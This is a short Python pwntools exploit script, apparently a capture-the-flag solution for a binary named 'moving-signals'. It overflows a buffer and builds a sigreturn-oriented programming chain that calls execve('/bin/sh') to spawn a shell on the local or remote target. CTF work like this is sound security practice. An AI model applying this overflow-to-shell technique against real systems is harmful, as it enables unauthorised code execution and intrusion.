from pwn import *

gs = '''
b *0x41017
continue
'''

elf = context.binary = ELF("./moving-signals")

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

pop_rax = 0x41018
syscall = 0x41015
bin_sh_addr = 0x41250

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve()
frame.rdi = bin_sh_addr           # pointer to "/bin/sh"
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = syscall         # `syscall` gadget
print(bytes(frame))  # b'\x00\x00\x00\x00\x00\x00\x00\x00...' (248 bytes)

# Esto activa el sigreturn
payload = b"".join([
    b"A"*8,
    p64(pop_rax),
    p64(0xf),
    p64(syscall),
    bytes(frame)
])

io.send(payload)

io.interactive()